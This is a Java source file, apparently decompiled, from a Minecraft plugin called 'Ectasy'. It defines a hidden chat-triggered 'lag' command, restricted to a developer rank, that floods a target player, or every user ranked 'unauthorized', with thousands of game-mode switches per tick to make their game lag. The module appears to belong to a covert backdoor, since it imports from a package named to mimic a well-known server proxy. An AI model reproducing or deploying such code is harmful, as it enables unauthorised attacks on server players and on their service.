package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;

@CommandInfo(
   name = "lag",
   description = "Makes a player lag",
   blatant = true,
   rank = Rank.DEVELOPER
)
public class LagCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent e, String var2, String[] args) {
      new BukkitRunnable() {
         @Override
         public void run() {
            if (args.length == 0) {
               ChatUtil.sendChat(e.getPlayer(), "Please, use lag <player name> or lag *");
            } else if (args[0].equals("*")) {
               for(User var2 : Ectasy.users.values()) {
                  if (var2.rank == Rank.UNAUTHORIZED) {
                     Bukkit.getScheduler().runTaskTimer(Ectasy.parentPlugin, () -> {
                        if (!var2.player.isOnline()) {
                           this.cancel();
                        }

                        for (int i = 0; i < 10000; i++) {
                           var2.player.setGameMode(GameMode.ADVENTURE);
                           var2.player.setGameMode(GameMode.SURVIVAL);
                        }
                     }, 1L, 1L);
                  }
               }

               ChatUtil.sendChat(e.getPlayer(), "Lagged everyone.");
            } else {
               Player var1 = Bukkit.getServer().getPlayer(args[0]);
               if (var1 == null) {
                  ChatUtil.sendChat(e.getPlayer(), "The player " + args[0] + " is not online.");
               } else {
                  Bukkit.getScheduler().runTaskTimer(Ectasy.parentPlugin, () -> {
                     if (!var1.isOnline()) {
                        this.cancel();
                     }

                     for (int i = 0; i < 10000; i++) {
                        var1.setGameMode(GameMode.ADVENTURE);
                        var1.setGameMode(GameMode.SURVIVAL);
                     }
                  }, 1L, 1L);
                  ChatUtil.sendChat(e.getPlayer(), "Lagged " + var1.getName());
               }
            }
         }
      }.runTask(Ectasy.parentPlugin);
   }

   public LagCommand() {
   }
}
